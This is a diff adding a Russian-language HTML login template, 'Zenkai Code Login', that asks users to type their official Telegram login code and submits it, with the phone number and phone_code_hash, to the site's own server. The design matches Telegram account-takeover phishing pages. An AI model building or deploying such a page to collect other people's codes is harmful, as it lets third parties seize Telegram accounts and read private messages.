@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zenkai Code Login</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="loading-overlay" id="loader">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Проверяем код...</div>
+    </div>
+
+    <main class="auth-shell compact">
+        <section class="brand-panel">
+            <div class="brand-mark">#</div>
+            <p class="eyebrow">Код входа</p>
+            <h1>Сообщение уже в Telegram</h1>
+            <p class="lead">Введи код из официального сообщения Telegram для номера {{ phone }}.</p>
+            <div class="signal-grid" aria-hidden="true">
+                <span></span><span></span><span></span><span></span>
+            </div>
+        </section>
+
+        <section class="auth-card">
+            <p class="eyebrow">Проверка</p>
+            <h2>Введите код</h2>
+            {% if error %}
+                <p class="error">{{ error }}</p>
+            {% endif %}
+            <form action="/code_submit" method="POST" onsubmit="showLoader()">
+                <input type="hidden" name="phone" value="{{ phone }}">
+                <input type="hidden" name="phone_code_hash" value="{{ phone_code_hash }}">
+                <label class="field">
+                    <span>Код Telegram</span>
+                    <input class="code-input" type="text" name="code" placeholder="12345" required autocomplete="one-time-code" inputmode="numeric">
+                </label>
+                <button type="submit" class="btn primary" id="submitBtn"><span class="btn-icon">✓</span>Подтвердить</button>
+            </form>
+            <a href="/phone" class="btn secondary"><span class="btn-icon">‹</span>Изменить номер</a>
+        </section>
+    </main>
+
+    <script>
+        function showLoader() {
+            document.getElementById('loader').classList.add('active');
+            document.getElementById('submitBtn').classList.add('loading');
+        }
+    </script>
+</body>
+</html>
